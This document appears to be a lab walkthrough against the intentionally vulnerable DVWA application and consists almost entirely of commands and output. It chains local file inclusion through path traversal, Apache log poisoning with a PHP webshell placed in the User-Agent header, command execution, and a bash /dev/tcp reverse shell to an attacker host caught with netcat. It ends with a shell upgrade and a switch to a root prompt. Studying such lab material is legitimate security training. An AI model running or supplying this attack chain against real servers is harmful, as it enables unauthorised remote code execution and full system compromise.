Local File Inclusion (Apache Logs):

Confirm you can read the Apache Log File:
http://dvwa.local/DVWA/vulnerabilities/fi/?page=../../../../../../../../../var/log/apache2/access.log
or
┌──(kali㉿kali)-[~]
└─$ curl -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/fi/?page=../../../../../../../../../var/log/apache2/access.log"
<Log File Entries>

We are able to read the log. This suggests we can inject php code into the log file and execute it.


Put this PHP code in the "User Agent" Field in Burp Suite and forward the request:
<?php echo system($_GET['cmd']); ?>
or
┌──(kali㉿kali)-[~]
└─$ curl -s -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/"

Trigger the Webshell:
http://dvwa.local/DVWA/vulnerabilities/fi/?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
or
┌──(kali㉿kali)-[~]
└─$ curl -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/fi/?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la"
<snip>
172.28.48.1 - - [25/May/2025:22:56:52 -0700] "GET / HTTP/1.1" 200 10958 "-" "total 40
drwxr-xr-x  4 www-data www-data 4096 May 25 22:33 .
drwxr-xr-x 20 www-data www-data 4096 May 25 22:33 ..
-rw-r--r--  1 www-data www-data 1050 May 25 22:33 file1.php
-rw-r--r--  1 www-data www-data 1054 May 25 22:33 file2.php
-rw-r--r--  1 www-data www-data 1559 May 25 22:33 file3.php
-rw-r--r--  1 www-data www-data  372 May 25 22:33 file4.php
drwxr-xr-x  2 www-data www-data 4096 May 25 22:33 help
-rw-r--r--  1 www-data www-data 1410 May 25 22:33 include.php
-rw-r--r--  1 www-data www-data  995 May 25 22:33 index.php
drwxr-xr-x  2 www-data www-data 4096 May 25 22:33 source
drwxr-xr-x  2 www-data www-data 4096 May 25 22:33 source"
<snip>

The log poisoning succeeded!


Reverse Shell:
http://dvwa.local/DVWA/vulnerabilities/fi/?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+%3E%26+/dev/tcp/192.168.48.128/1234+0%3E%261'
or
┌──(kali㉿kali)-[~]
└─$ curl -I -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/fi/?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.48.128/1234+0%3E%261%27"

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.48.128] from (UNKNOWN) [192.168.48.1] 51276
bash: cannot set terminal process group (12090): Inappropriate ioctl for device
bash: no job control in this shell
www-data@wsl:/var/www/html/DVWA/vulnerabilities/fi$ python3 -c 'import pty; pty.spawn("/bin/sh")'
<s/fi$ python3 -c 'import pty; pty.spawn("/bin/sh")'       
$ su hacker
su hacker
root@wsl:/var/www/html/DVWA/vulnerabilities/fi# 
